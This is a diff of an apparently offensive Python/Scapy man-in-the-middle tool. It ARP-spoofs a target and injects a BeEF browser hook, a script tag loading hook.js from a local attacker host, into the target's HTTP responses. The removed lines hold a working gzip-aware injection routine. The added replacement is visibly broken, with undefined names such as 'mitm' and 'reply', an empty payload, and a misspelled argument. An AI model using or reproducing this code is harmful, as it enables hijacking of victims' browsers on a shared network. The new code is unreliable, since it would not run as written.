@@ -5,9 +5,6 @@ from scapy.all import *
 
 import subprocess
 import threading
-import StringIO
-import zlib
-import gzip
 import time
 import os
 import re
@@ -21,8 +18,6 @@ class HostUnreachable(Exception):
 class MITM(object):
 
     ACK = 0x10
-
-    beefPayload = "<script src=\"http://192.168.0.13:3000/hook.js\"></script>"
 
     def __init__(self, gw, target):
         if gw: self.gateway = gw
@@ -86,62 +81,31 @@ class MITM(object):
         while True:
             sendp(p1, count=1, verbose=0)
             sendp(p2, count=1, verbose=0)
-            if not self.hooked:
-                self.hooked = self.fakeping(frm=self.gateway, to=self.target)
-                if self.hooked:
-                    self.beefSpoof()
-                    # self.dnsSpoof()
+            if not self.hooked: self.hooked = self.fakeping(frm=self.gateway, to=self.target)
             else:
-                # print "ok"
+                self.beefSpoof()
+                # self.dnsSpoof()
                 time.sleep(1)
 
     def dnsSpoof(self):
         sniff(filter="udp port 53 and ip src " + self.target, prn=self.fakeDNS)
 
     def beefSpoof(self):
-        t = threading.Thread(target=sniff, kwargs={'filter':"ip dst " + self.target, 'prn':self.injectBeef})
-        t.start()
-
-    def addMeat(self, pkt):
-
-        header, gzipEncoded = pkt[Raw].load.split("\r\n\r\n", 1)
-        print header
-        print gzipEncoded
-        try:
-            gzipDecoded = zlib.decompress(gzipEncoded.split("\r\n", 1)[1], 16+zlib.MAX_WBITS)
-            gzipDecoded = gzipDecoded.replace('</head>', '<script src=\"http://192.168.0.13:3000/hook.js\"></script>\n</head>')
-
-            out = StringIO.StringIO()
-            with gzip.GzipFile(fileobj=out, mode="w") as f:
-              f.write(gzipDecoded)
-            pkt[Raw].load = header + '\r\n\r\n' + out.getvalue()
-        except:
-            a = open('test', 'wb')
-            a.write(gzipEncoded.split("\r\n", 1)[1])
-            a.close()
-            print 'error'
-            import sys
-            sys.exit(0)
-
-        return pkt
+        sniff(filter="ip dst " + self.target, prn=self.injectBeef)
 
     def injectBeef(self, pkt):
-        if (TCP in pkt and pkt[TCP].flags & MITM.ACK and pkt.haslayer(Raw) and pkt[TCP].sport == 80 and pkt[Raw].load.startswith('HTTP')) and self.hooked:
-            spfResp = pkt
-            del pkt[IP].len
-            del pkt[IP].chksum
-            del pkt[TCP].chksum
+        print pkt.summary()
+        if (TCP in pkt and pkt[TCP].flags & mitm.ACK and reply.haslayer(Raw)) and self.hooked:
+            if "</head>" in pkt[Raw].load:
+                spfResp = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=80, dport=pkt[TCP].dport, flags=pkt[TCP].flags) / Raw()
+                spfResp[Raw].load = spfResp[Raw].load.replace('</head>', '<script src="' + self.gateway + ':3000/hook.js"></script></head>')
+                send(spfResp,verbose=0)
+                return "Hook sent !"
 
-            pkt = self.addMeat(pkt)
-
-            if len(spfResp) > 1480:
-                try:
-                    sendp(fragment(spfResp, 1480), verbose=0)
-                except:
-                    print len(spfResp)
             else:
-                sendp(spfResp, verbose=0)
-                # return "Not spoofed"
+                return self.send(pkt, verbos=0)
+        else:
+            return False
 
     def fakeDNS(self, pkt):
         if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[IP].src != self.gateway) and self.hooked:
